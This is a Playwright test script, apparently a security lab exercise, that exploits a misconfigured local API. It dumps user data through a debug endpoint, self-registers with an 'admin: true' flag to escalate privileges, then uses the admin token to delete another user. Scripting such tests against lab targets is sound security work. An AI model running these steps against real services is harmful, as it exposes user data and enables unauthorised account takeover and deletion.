
// Kịch bản 5: Khai thác lỗ hổng Security Misconfiguration 

import { test, expect } from '@playwright/test';
import { PlaywrightTestConfig } from '@playwright/test';

const config: PlaywrightTestConfig = {
    use: {
        baseURL: 'http://localhost:5002'
    },
};
export default config;

test('Exploiting the Security Misconfiguration', async ({ request }) => {
    const inforUser = await request.get(`/users/v1/_debug`);
    expect(inforUser.ok()).toBeTruthy();
    expect(inforUser.status()).toBe(200);
    console.log(await inforUser.json());

    await test.step('Vertical privilege escalation to admin', async () => {
        const register = await request.post(`/users/v1/register`, {
            data: {
                admin: true,
                email: 'thieuhoaadmin_1@gmail.com',
                username: 'thieuhoa_admin_1',
                password : 'test1'
            },
      });
      expect(register.ok()).toBeTruthy();
    });

    await test.step('Login with new admin account', async () => {
        const login = await request.post(`/users/v1/login`, {
            data: {
                username: 'thieuhoa_admin_1',
                password : 'test1'
            },
      });
        expect(login.ok()).toBeTruthy();
        const token = await login.json()
        let accessToken = token.auth_token

    await test.step('Delete user', async () => {
        const deleteUser = await request.delete(`/users/v1/hoahoa`, {
            headers:{
              Authorization: `Bearer ${accessToken}`
            }
          });
        expect(deleteUser.ok()).toBeTruthy();
        }); 
    });
});
  


